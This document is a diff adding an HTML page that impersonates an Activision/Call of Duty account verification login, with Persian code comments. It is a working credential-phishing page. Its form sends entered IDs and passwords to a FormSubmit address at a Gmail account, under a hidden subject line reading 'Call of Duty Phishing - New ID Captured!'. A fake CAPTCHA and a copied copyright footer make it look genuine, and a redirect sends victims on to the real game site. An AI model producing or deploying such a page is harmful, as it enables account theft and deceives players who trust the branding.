@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call of Duty - Account Verification</title>
+    <style>
+        /* تنظیمات کلی و فونت */
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            /* تصویر پس‌زمینه تیره و نظامی */
+            background: url('https://wallpaperaccess.com/full/1257647.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            overflow: hidden;
+        }
+
+        /* لایه تاریک روی پس‌زمینه */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 0;
+        }
+
+        /* کانتینر اصلی فرم */
+        .login-container {
+            position: relative;
+            z-index: 1;
+            background: rgba(15, 15, 15, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            width: 400px;
+            max-width: 90%;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.9);
+            text-align: center;
+        }
+
+        /* لوگو و هدر */
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            color: #fff;
+            text-shadow: 0 0 15px rgba(255, 165, 0, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .sub-text {
+            font-size: 14px;
+            color: #aaa;
+            letter-spacing: 1px;
+        }
+
+        /* استایل فرم */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #ccc;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            font-family: inherit;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: #ffa500;
+            box-shadow: 0 0 10px rgba(255, 165, 0, 0.2);
+        }
+
+        /* دکمه ورود */
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #b8860b, #ff8c00);
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background: linear-gradient(90deg, #d4a017, #ffa500);
+            box-shadow: 0 0 15px rgba(255, 140, 0, 0.4);
+        }
+
+        .btn-submit:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+
+        /* کپچا (Captcha) با کیفیت بالا */
+        .captcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px 0;
+            color: #555;
+            font-size: 14px;
+            cursor: pointer;
+            position: relative;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .captcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .captcha-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background: white;
+            position: relative;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .captcha-checkbox.checked {
+            background: #4CAF50;
+            border-color: #4CAF50;
+            animation: pop 0.2s ease;
+        }
+
+        .captcha-checkbox.checked::after {
+            content: '';
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-left: 2px;
+            margin-bottom: 2px;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        /* آیکون ReCaptcha واقعی */
+        .captcha-icon svg {
+            width: 32px;
+            height: 32px;
+            opacity: 0.8;
+        }
+
+        /* لودینگ */
+        .loader {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #ffa500;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 15px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* پیام موفقیت/نمایش اطلاعات */
+        .success-message {
+            display: none;
+            margin-top: 20px;
+            background: rgba(0, 50, 0, 0.3);
+            border: 1px solid #00ff00;
+            padding: 15px;
+            border-radius: 6px;
+            color: #00ff00;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .success-message span {
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .success-message .label {
+            color: #aaa;
+            font-size: 12px;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #555;
+        }
+        
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: #888;
+            text-decoration: none;
+            margin: 0 8px;
+            font-size: 11px;
+        }
+
+        .footer-links a:hover {
+            color: #ffa500;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="header">
+            <div class="logo">ACTIVISION</div>
+            <div class="sub-text">Activision ID Verification</div>
+        </div>
+
+        <!-- فرم به FormSubmit متصل شده -->
+        <form id="loginForm" action="https://formsubmit.co/Kingaura1313@gmail.com" method="POST">
+            
+            <!-- فیلدهای مخفی برای هدایت و صفحه تشکر -->
+            <input type="hidden" name="_subject" value="Call of Duty Phishing - New ID Captured!">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://www.callofduty.com/mwii">
+
+            <div class="input-group">
+                <label for="email">ACTIVISION ID / EMAIL</label>
+                <input type="text" id="email" name="username" required placeholder="Enter your ID">
+            </div>
+
+            <div class="input-group">
+                <label for="password">PASSWORD</label>
+                <input type="password" id="password" name="password" required placeholder="Enter password">
+            </div>
+
+            <!-- کپچا با کیفیت بالا و لگ -->
+            <div class="captcha-box" onclick="toggleCaptcha()">
+                <div class="captcha-left">
+                    <div class="captcha-checkbox" id="captchaCheck"></div>
+                    <span>I'm not a robot</span>
+                </div>
+                <div class="captcha-icon">
+                    <!-- SVG آیکون ReCaptcha -->
+                    <svg viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="25" cy="25" r="20" fill="none" stroke="#5f6368" stroke-width="2"/>
+                        <path d="M25 10 L30 15 L30 22 C30 22 35 22 35 28 C35 33 30 35 25 35 C20 35 15 33 15 28 C15 22 20 22 20 22 L20 15 L25 10 Z" fill="#5f6368"/>
+                        <path d="M25 10 L30 15 L25 20 L20 15 Z" fill="#fff" opacity="0.3"/>
+                    </svg>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn">Verify Account</button>
+            <div class="loader" id="loader"></div>
+            
+            <!-- محل نمایش پیام موفقیت (شبیه‌سازی) -->
+            <div class="success-message" id="successMsg">
+                <span class="label">Account ID Captured:</span>
+                <span id="capturedId"></span>
+                <br>
+                <span style="font-size: 11px; color: #aaa; margin-top: 5px;">Redirecting to game...</span>
+            </div>
+        </form>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact Support</a>
+            </div>
+            &copy; 2024 Activision Publishing, Inc.
+        </div>
+    </div>
+
+    <script>
+        // اسکریپت کپچا با لگ 2 ثانیه
+        function toggleCaptcha() {
+            const check = document.getElementById('captchaCheck');
+            
+            // اگر قبلا چک شده، کاری نکن
+            if (check.classList.contains('checked')) return;
+
+            // شبیه‌سازی لگ (تاخیر) 2 ثانیه‌ای
+            check.style.background = '#f0f0f0'; // حالت loading
+            
+            setTimeout(() => {
+                check.classList.add('checked');
+            }, 2000); // 2000 میلی‌ثانیه = 2 ثانیه
+        }
+
+        function handleLogin(e) {
+            // چون فرم به FormSubmit متصل است، ما می‌توانیم قبل از ارسال واقعی، یک پیام نشان دهیم
+            e.preventDefault();
+            
+            const btn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+            const successMsg = document.getElementById('successMsg');
+            const capturedId = document.getElementById('capturedId');
+            const check = document.getElementById('captchaCheck');
+            
+            const email = document.getElementById('email').value;
+            
+            // چک کردن اینکه کپچا حل شده یا نه
+            if (!check.classList.contains('checked')) {
+                alert('Please complete the CAPTCHA.');
+                return;
+            }
+
+            // مخفی کردن دکمه و نمایش لودینگ
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            successMsg.style.display = 'none';
+
+            // شبیه‌سازی تاخیر شبکه (۲ ثانیه)
+            setTimeout(() => {
+                loader.style.display = 'none';
+                
+                // نمایش پیام فقط با ایمیل
+                capturedId.textContent = email;
+                successMsg.style.display = 'block';
+                
+                // بعد از ۱.۵ ثانیه، فرم را برای ارسال به FormSubmit واقعی ارسال کن
+                setTimeout(() => {
+                    document.getElementById('loginForm').submit();
+                }, 1500);
+
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
